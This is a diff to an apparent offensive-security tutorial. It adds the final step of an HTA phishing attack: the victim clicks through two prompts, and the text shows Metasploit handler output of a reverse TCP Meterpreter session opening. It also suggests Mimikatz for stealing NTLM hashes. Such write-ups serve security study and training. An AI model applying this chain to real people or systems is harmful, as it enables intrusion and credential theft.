@@ -277,5 +277,19 @@ python3 -m http.server 8000
 Do not forget to start the _Metasploit exploit handler_ as well!
 
 ## Profit!!!
-Now all the attacker needs to do is wait for the victim to visit the malicious webpage, click on "Run" to run the HTA file,
+Now all the attacker needs to do is wait for the victim to visit the malicious webpage, click on "Run" in the dialogue prompt, click "Run" again through a security warning and wait for the final stage _meterpreter_ payload to be executed.
+
+As soon as that happens, the attacker is granted with a very familiar and rewarding message displaying:
+
+```
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+[*] Sending stage (180291 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened (192.168.1.104:8080 -> 192.168.1.100:50483) at 2020-04-22 20:03:35 +0530
+
+meterpreter > 
+```
+
+Of course now they can perform all sorts of malicious activity like running the infamous _Mimikatz_ to get NTLM hashes yada yada yada. 
 
